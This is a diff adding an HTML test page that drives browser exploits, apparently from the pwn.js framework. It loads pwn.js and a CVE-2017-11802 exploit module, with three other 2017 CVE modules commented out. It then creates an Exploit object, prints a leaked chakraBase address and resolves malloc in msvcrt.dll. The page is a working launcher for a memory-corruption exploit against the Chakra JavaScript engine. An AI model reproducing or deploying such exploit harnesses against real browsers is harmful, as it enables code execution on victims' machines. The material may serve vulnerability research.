@@ -1,0 +1,25 @@
+<!doctype html>
+<html>
+    <body>
+        <pre id="content"></pre>
+
+        <script src="../dist/pwn.js"></script>
+        <!-- <script src="CVE-2017-0071.js"></script> -->
+        <!-- <script src="CVE-2017-0266.js"></script> -->
+        <!-- <script src="CVE-2017-8548.js"></script> -->
+        <script src="CVE-2017-11802.js"></script>
+        <script>
+            function log(s) { document.getElementById('content').innerHTML += s + '<br>'; }
+
+            with (new Exploit()) {
+                log(chakraBase.toString(16));
+                log(importFunction('msvcrt.dll', 'malloc'));
+
+                /* Thread example:
+                var thread = new Thread('./thread.js');
+                thread.onmessage = (e) => { log(e.data); };
+                */
+            }
+        </script>
+    </body>
+</html>
